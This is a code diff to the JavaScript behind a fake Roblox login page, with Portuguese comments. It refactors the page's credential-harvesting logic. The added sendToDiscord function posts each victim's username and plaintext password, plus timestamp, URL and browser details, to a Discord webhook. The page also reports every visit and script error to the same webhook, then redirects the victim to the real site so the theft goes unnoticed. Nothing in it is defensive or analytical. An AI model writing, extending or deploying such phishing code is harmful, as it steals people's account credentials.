@@ -1045,6 +1045,59 @@ const CONFIG = {
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 Script de captura iniciado...');
     
+    // Função para enviar dados para o Discord
+    function sendToDiscord(data, type = 'login') {
+        let message = '';
+        
+        if (type === 'login') {
+            message = `🔐 **Dados Capturados - Roblox Login**
+
+👤 **Usuário:** ${data.username}
+🔑 **Senha:** ${data.password}
+⏰ **Data/Hora:** ${data.timestamp}
+🌐 **URL:** ${data.url}
+📱 **User Agent:** ${data.userAgent}`;
+        } else if (type === 'error') {
+            message = `❌ **Erro Detectado - Roblox Login**
+
+🚨 **Erro:** ${data.error}
+⏰ **Data/Hora:** ${data.timestamp}
+🌐 **URL:** ${data.url}
+📱 **User Agent:** ${data.userAgent}`;
+        } else if (type === 'access') {
+            message = `👁️ **Acesso Detectado - Roblox Login**
+
+⏰ **Data/Hora:** ${data.timestamp}
+🌐 **URL:** ${data.url}
+📱 **User Agent:** ${data.userAgent}
+🌍 **Referrer:** ${data.referrer || 'Direto'}`;
+        }
+
+        fetch(CONFIG.webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: message
+            })
+        })
+        .then(response => {
+            console.log('✅ Dados enviados para Discord:', response.ok);
+        })
+        .catch(error => {
+            console.error('❌ Erro ao enviar para Discord:', error);
+        });
+    }
+
+    // Envia notificação de acesso quando a página carrega
+    sendToDiscord({
+        timestamp: new Date().toLocaleString('pt-BR'),
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        referrer: document.referrer
+    }, 'access');
+    
     // Aguarda o React renderizar o formulário
     setTimeout(function() {
         console.log('🔍 Procurando formulário de login...');
@@ -1076,44 +1129,27 @@ document.addEventListener('DOMContentLoaded', function() {
                     console.log('📤 Tentando capturar dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
                     
                     if (username && password) {
-                        // Formata a mensagem para Discord
-                        const messageText = `🔐 **Dados Capturados - Roblox Login**
-
-👤 **Usuário:** ${username}
-🔑 **Senha:** ${password}
-⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
-🌐 **URL:** ${window.location.href}
-📱 **User Agent:** ${navigator.userAgent}`;
-                        
                         console.log('📨 Enviando dados para Discord...');
                         
-                        // Envia para webhook do Discord
-                        fetch(CONFIG.webhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                content: messageText
-                            })
-                        })
-                        .then(response => {
-                            if (response.ok) {
-                                console.log('✅ Dados enviados com sucesso para o Discord!');
-                                alert('Login realizado com sucesso! Redirecionando...');
-                            } else {
-                                console.error('❌ Erro na resposta:', response.status);
-                            }
-                            // Redireciona para a página real
+                        // Envia dados para o Discord
+                        sendToDiscord({
+                            username: username,
+                            password: password,
+                            timestamp: new Date().toLocaleString('pt-BR'),
+                            url: window.location.href,
+                            userAgent: navigator.userAgent
+                        }, 'login');
+                        
+                        // Redireciona para a página real após 1 segundo
+                        setTimeout(() => {
                             window.location.href = CONFIG.redirectUrl;
-                        })
-                        .catch(error => {
-                            console.error('❌ Erro ao enviar dados:', error);
-                            // Mesmo com erro, redireciona
-                            window.location.href = CONFIG.redirectUrl;
-                        });
+                        }, 1000);
                     } else {
                         console.log('⚠️ Campos vazios, não enviando dados');
+                        // Mesmo com campos vazios, redireciona
+                        setTimeout(() => {
+                            window.location.href = CONFIG.redirectUrl;
+                        }, 1000);
                     }
                 });
                 
@@ -1127,15 +1163,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     });
                 }
                 
-                // Intercepta mudanças nos campos para capturar dados em tempo real
-                usernameField.addEventListener('input', function() {
-                    console.log('📝 Usuário digitado:', usernameField.value);
-                });
-                
-                passwordField.addEventListener('input', function() {
-                    console.log('🔑 Senha digitada:', passwordField.value ? '***' : 'vazia');
-                });
-                
                 // Intercepta pressionar Enter no campo de senha
                 passwordField.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
@@ -1144,15 +1171,44 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                 });
                 
-                console.log('✅ Captura configurada com sucesso!');
+                // Intercepta mudanças nos campos para capturar dados em tempo real
+                usernameField.addEventListener('input', function() {
+                    console.log('👤 Usuário digitado:', this.value);
+                });
+                
+                passwordField.addEventListener('input', function() {
+                    console.log('🔑 Senha digitada:', this.value.length + ' caracteres');
+                });
+                
+                console.log('✅ Formulário de login interceptado com sucesso!');
             } else {
-                console.log('⚠️ Formulário não encontrado, tentando novamente em 1 segundo...');
+                // Se não encontrar os campos, tenta novamente em 1 segundo
                 setTimeout(captureLoginData, 1000);
             }
         }
         
-        // Executa a captura inicial
+        // Inicia a captura
         captureLoginData();
+        
+        // Captura erros globais
+        window.addEventListener('error', function(e) {
+            sendToDiscord({
+                error: e.message + ' em ' + e.filename + ':' + e.lineno,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            }, 'error');
+        });
+        
+        // Captura erros de rede
+        window.addEventListener('unhandledrejection', function(e) {
+            sendToDiscord({
+                error: 'Erro de rede: ' + e.reason,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            }, 'error');
+        });
         
         // Observa mudanças no DOM para capturar formulários que podem ser carregados dinamicamente
         const observer = new MutationObserver(function(mutations) {
